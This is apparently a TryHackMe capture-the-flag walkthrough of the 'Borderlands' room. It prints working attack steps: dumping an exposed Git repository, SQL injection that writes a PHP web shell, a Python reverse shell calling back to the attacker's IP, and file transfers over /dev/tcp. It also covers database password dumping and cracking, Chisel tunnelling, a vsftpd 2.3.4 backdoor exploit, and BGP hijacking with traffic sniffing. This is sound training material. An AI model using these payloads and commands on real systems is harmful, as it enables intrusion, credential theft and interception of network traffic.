# Borderlands - A TryHackMe Writeup

This challenge > [https://tryhackme.com/room/borderlands](https://tryhackme.com/room/borderlands)

Skills:

- Web Enumeration
- Github Project Enumeration
- SQLI (SQL Injection) Inject PHP code
- Chisel (Remote Port Forwarding)
- BGP hijacking
- Abusing FTP vsftpd 2.3.4

## The walkthrough

```bash
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.10.143.101
```

Once we know the open ports, we can conduct a more comprehensive scan using a series of basic recognition scripts with `-sC` and also use `-sV` to detect the version and services running on the open ports. The complete command for this action would be:

```bash
nmap -sC -sV -p22,80 10.10.143.101
```

We have noticed that there are links to PDF files on the website.

We can review the metadata of these files using the ExifTool to search for possible users. The command we use to review the metadata of a PDF file is as follows:

```bash
exiftool Context_Red_Teaming_Guide.pdf
```

After reviewing the metadata, we found a potential user named "billg". We also found four other files that we need to review, all of which were created by the user "billg" except for "Glibc_Adventures-The_Forgotten_Chunks.pdf", which was created by "Francois Goichon".

In addition, we discovered a login panel on the website. Before proceeding with this, we recall that during the Nmap scan, we found a ".git/" directory. We attempted to access this directory by typing "http://10.10.143.101/.git/" in our browser but received a "403 forbidden" error.

Although we encountered an error message while attempting to access a specific path on the website, we can continue to search for files within the Git repository. By using information from the HEAD file, we can attempt to retrieve all project files. To do so, we create a new folder named "repo", initialize a Git repository inside it, and make a GET request using curl to download the HEAD file from the ".git/logs/HEAD" path on the website. Follow these steps:

1. Create a folder using the command: `mkdir repo`
2. Inside this folder, use the command: `git init`
3. Next, make a GET request with curl: `curl -s -X GET http://10.10.143.101/.git/logs/HEAD`

Then, go to the ".git/objects" path and create a new folder named "79". After that, use another GET request with curl to download a specific file within the "79" folder. Use the command:

```bash
curl -s -X GET http://10.10.143.101/.git/objects/79/c9539b6566b06d6dec2755fdf58f5f9ec8822f -o c9539b6566b06d6dec2755fdf58f5f9ec8822f
```

Finally, use the command `git cat-file -p` to review the content of the downloaded file. Here is a reference image for this process:

![Reference Image](reference_image.png)

This creates a tree that allows us to access updated files in the system.

We will now create a folder in `.git/objects` using the command `mkdir 51`. Then, we access this folder

 and make a GET request using curl to download a file with the information we need. The complete command is as follows:

```bash
curl -s -X GET http://10.10.143.101/.git/objects/51/d63292792fb7f97728cd3dcaac3ef364f374ba -o d63292792fb7f97728cd3dcaac3ef364f374ba
```

Once the file is downloaded, we use the `cat-file -p` command to review its contents.

It is likely that these files contain relevant information, so we will download `api.php` and `home.php` in the same way as before. To do this, we create a new folder in `.git/objects` with the command `mkdir 22`. Then, we access this folder and make a GET request using curl to download the desired file. The command is as follows:

```bash
curl -s -X GET http://10.10.143.101/.git/objects/22/29eb414d7945688b90d7cd0a786fd888bcc6a4 -o 29eb414d7945688b90d7cd0a786fd888bcc6a4
```

We then use the `cat-file -p` command to review the contents of the downloaded file. The complete command is:

```bash
git cat-file -p 2229eb414d7945688b90d7cd0a786fd888bcc6a4 > ../../../../api.php
```

In this way, we can obtain valuable information from the system.

We will create a new directory in `.git/objects` using the command `mkdir 2a`. Then, we will perform a GET request on the directory `2a` using the command:

```bash
curl -s -X GET http://10.10.143.101/.git/objects/2a/116a56a6e31ef1836796936dbc05af1f986a26 -o 116a56a6e31ef1836796936dbc05af1f986a26
```

Afterwards, we will use the command `git cat-file -p` to view the contents of the file.

```bash
git cat-file -p 2a116a56a6e31ef1836796936dbc05af1f986a26 > ../../../../home.php
```

Once we have reviewed the `home.php` file, we can observe: `href="api.php?documentid='`. We then decide to try that address in the browser using the following URL:

http://10.10.143.101/api.php?documentid=1&apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD

This shows us paths to PDF files that we had previously seen. Therefore, to search for SQL injection vulnerabilities, we add a single quote symbol to the URL and review the results obtained.

It appears that the system is vulnerable to SQL injection. We will start manual exploitation of this SQL injection using the following command:

```
http://10.10.143.101/api.php?documentid=1%20union%20select%201,%20%22tryhackme%22,%203%20into%20outfile%20%22../../../../var/www/html/trest.txt%22--%20-&apikey=WEBLhvOJAH8d50Z4y5G5g
```

After executing the command, we can see the generated file at: [http://10.10.143.101/trest.txt](http://10.10.143.101/trest.txt)

This result indicates that we can export files to a server path through SQL statements. We can take advantage of this vulnerability to inject PHP code:

```
http://10.10.143.101/api.php?documentid=1 union select 1, "<?php system($_REQUEST['cmd']); ?>", 3 into outfile "../../../../var/www/html/thm.php"-- -&apikey=WEBLhvOJAH8d50Z4y5G5g
```

Then, in the browser, we can execute the following command to get remote command execution:

[http://10.10.143.101/thm.php?cmd=whoami](http://10.10.143.101/thm.php?cmd=whoami)

This shows that we have achieved remote command execution through SQL injection. Now, our goal is to gain access to the system through a reverse shell. For this, we will use Python Shell from Hack Tools by Ludovic COULON and Riadh B. in the URL and `nc -nlvp 433` on our machine:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.39.16",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
We have gained access to the system and found the flag in the `/var/www` directory.

Now, if we navigate to the directory using the command `cd html`, we can find the `function.php` file, which may contain important information.

Indeed, we have access to the database, so let's see what we find. We enter the database with the command `mysql -u root -p`, then we use `show databases;` Next, we use: `use myfirstwebsite;` Then, we use: `show tables;` After that, we use `describe users;` Finally, we use `select username, password from users;`

We have found the user "billg" and the password that we may be able to crack with john. So, let's let John try to crack the password while we search for more information.

`john --wordlist=rockyou.txt hash`

Upon reviewing the network segments, we see another IP, so we will analyze it using nmap. For this, we need to download the nmap static binary and upload it to the server. On our machine, we set up a listener with `nc -nlvp 443 < nmap` On the victim's server, we use `cat > nmap < /dev/tcp/ipattacker/443`

Now that we have nmap:
```
nmap -sn 172.16.1.10/24
```

Now, we proceed to scan the available ports on the victim machine using the following command:

```
nmap --open -T5 -v -n -p- 172.16.1.128
```

To carry out port forwarding, we shall employ the use of Chisel, which can be downloaded from this source: [https://github.com/jpillora/chisel/releases/tag/v1.8.1](https://github.com/jpillora/chisel/releases/tag/v1.8.1) Once we have the Chisel binary, we transfer it to the victim machine and configure it to connect to our server: On our machine, we open a waiting connection: `nc -nlvp 443 < chisel` On the victim machine, we use the following command to transfer the Chisel binary: `cat > chisel < /dev/tcp/ipatacante/443` We notice that the victim's FTP server is vsftpd 2.3.4 and that it is vulnerable to Backdoor command execution. To exploit this vulnerability, we clone the following repository: 

```
git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit
```

And we execute it. Remember that we are using Chisel, so our localhost is actually the victim machine. This script requires that port 6200 be tunneled through Chisel, so we do the following: 

*On our machine > `./chisel server --reverse -p 1234`
*On the victim machine > `/chisel client 10.2.39.16:1234 R:6200:172.16.1.128:6200 R:2121:172.16.1.128:21`
*And on our machine > `python3 exploit.py 127.0.0.1`

We have obtained root access to another victim machine, and also have the flag in the `/root/` directory. By using the `ps` command, we can view the active processes and see that `bgpd` is running. We could attempt a BGP hijacking attack, let's view the configuration file with the following command:

```
cat /etc/quagga/bgpd.conf
```

Here we can see our router and the two neighbors we have, so we need to intercept the "conversation" between them. Therefore, we need to redirect all traffic to ourselves. To accomplish this, we searched for an article that explains how to do it, and I recommend this one: [https://medium.com/r3d-buck3t/bgp-hijacking-attack-7e6a30711246](https://medium.com/r3d-buck3t/bgp-hijacking-attack-7e6a30711246)

In the terminal, we typed the command `vtysh` to begin configuring everything. First, we connected to the router and configured the BGP protocol to announce our subnets using the following commands: 

```
configure terminal 
router bgp 60001 
network 172.16.2.0/25 
network 172.16.3.0/25 
end 
clear ip bgp * out 
```

Once we have configured the router, we used the `tcpdump` command to intercept the network traffic and search for the necessary flags with the following command: 

```
tcpdump -i eth0 -A
```

After analyzing the captured traffic, we found the UDP and TCP flags we needed to solve the challenge. With this, we have successfully solved the #tryhackme machine challenge.
